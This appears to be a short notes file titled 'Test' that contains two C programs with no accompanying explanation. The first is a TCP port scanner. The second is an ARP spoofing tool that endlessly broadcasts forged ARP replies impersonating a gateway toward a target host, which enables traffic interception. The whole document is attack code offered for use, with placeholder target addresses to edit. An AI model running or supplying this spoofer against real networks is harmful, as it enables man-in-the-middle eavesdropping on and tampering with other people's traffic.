# Test
# 1- Port Scanning 

```bash
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/socket.h>

void port_scan(char *ip, int start_port, int end_port) {
    int sock;
    struct sockaddr_in addr;
    for (int port = start_port; port <= end_port; port++) {
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) {
            perror("Socket");
            exit(1);
        }
        addr.sin_family = AF_INET;
        addr.sin_port = htons(port);
        addr.sin_addr.s_addr = inet_addr(ip);

        if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) == 0) {
            printf("Port %d is open\n", port);
        }
        close(sock);
    }
}

int main() {
    char *ip = "127.0.0.1";  // Change this to the target IP
    int start_port = 1;
    int end_port = 1024;
    port_scan(ip, start_port, end_port);
    return 0;
}
```
# 2. ARP Spoofing (Intermédiaire)
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>
#include <net/if.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/if_ether.h>
#include <netinet/ether.h>

void arp_spoof(char *target_ip, char *spoof_ip, char *iface) {
    int sockfd;
    struct ifreq if_idx;
    struct ifreq if_mac;
    struct ether_header *eh = (struct ether_header *)malloc(sizeof(struct ether_header));
    struct ether_arp *arp_req = (struct ether_arp *)malloc(sizeof(struct ether_arp));
    struct sockaddr_ll socket_address;

    if ((sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) == -1) {
        perror("socket");
        exit(EXIT_FAILURE);
    }

    memset(&if_idx, 0, sizeof(struct ifreq));
    strncpy(if_idx.ifr_name, iface, IFNAMSIZ-1);
    if (ioctl(sockfd, SIOCGIFINDEX, &if_idx) < 0) {
        perror("SIOCGIFINDEX");
        exit(EXIT_FAILURE);
    }

    memset(&if_mac, 0, sizeof(struct ifreq));
    strncpy(if_mac.ifr_name, iface, IFNAMSIZ-1);
    if (ioctl(sockfd, SIOCGIFHWADDR, &if_mac) < 0) {
        perror("SIOCGIFHWADDR");
        exit(EXIT_FAILURE);
    }

    memset(eh, 0, sizeof(struct ether_header));
    memcpy(eh->ether_shost, if_mac.ifr_hwaddr.sa_data, 6);
    memset(eh->ether_dhost, 0xff, 6);
    eh->ether_type = htons(ETH_P_ARP);

    memset(arp_req, 0, sizeof(struct ether_arp));
    arp_req->arp_hrd = htons(ARPHRD_ETHER);
    arp_req->arp_pro = htons(ETHERTYPE_IP);
    arp_req->arp_hln = ETHER_ADDR_LEN;
    arp_req->arp_pln = sizeof(in_addr_t);
    arp_req->arp_op = htons(ARPOP_REPLY);
    memcpy(arp_req->arp_sha, if_mac.ifr_hwaddr.sa_data, 6);
    inet_pton(AF_INET, spoof_ip, arp_req->arp_spa);
    memset(arp_req->arp_tha, 0x00, 6);
    inet_pton(AF_INET, target_ip, arp_req->arp_tpa);

    memcpy(arp_req->arp_tha, arp_req->arp_sha, 6);

    memcpy(&socket_address.sll_addr, if_mac.ifr_hwaddr.sa_data, 6);
    socket_address.sll_halen = ETH_ALEN;
    socket_address.sll_ifindex = if_idx.ifr_ifindex;
    socket_address.sll_protocol = htons(ETH_P_ARP);

    unsigned char *packet = (unsigned char *)malloc(sizeof(struct ether_header) + sizeof(struct ether_arp));
    memcpy(packet, eh, sizeof(struct ether_header));
    memcpy(packet + sizeof(struct ether_header), arp_req, sizeof(struct ether_arp));

    while (1) {
        if (sendto(sockfd, packet, sizeof(struct ether_header) + sizeof(struct ether_arp), 0,
                   (struct sockaddr*)&socket_address, sizeof(struct sockaddr_ll)) < 0) {
            perror("sendto");
            exit(EXIT_FAILURE);
        }
        sleep(2);
    }
    close(sockfd);
    free(eh);
    free(arp_req);
    free(packet);
}

int main() {
    char *target_ip = "192.168.1.100";  // Change to the target IP
    char *spoof_ip = "192.168.1.1";  // Change to the spoofed IP
    char *iface = "eth0";  // Change to the network interface
    arp_spoof(target_ip, spoof_ip, iface);
    return 0;
}
```





